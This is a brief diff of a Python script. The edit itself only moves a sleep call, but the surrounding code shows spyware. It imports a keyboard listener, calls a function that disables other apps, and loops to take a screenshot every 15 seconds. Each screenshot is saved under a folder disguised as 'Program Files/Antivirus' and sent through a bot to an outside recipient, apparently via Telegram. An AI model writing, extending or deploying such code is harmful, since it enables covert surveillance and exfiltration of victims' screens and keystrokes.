@@ -1,4 +1,4 @@
-﻿
+
 from pynput import keyboard 
 from pynput.keyboard import Key, KeyCode, Listener
 import time
@@ -54,12 +54,13 @@ def Multi_app_disabler():
 Multi_app_disabler()
 def screenshot():
     while True:
-        time.sleep(15)
 
         myscreenshot= pyautogui.screenshot()
         myscreenshot.save(final_patch+"\screen.png")
         img = open('C:/Program Files/Antivirus/screen.png','rb')
         bot.send_photo(MyNums,img)
+        time.sleep(15)
+
 
 
 
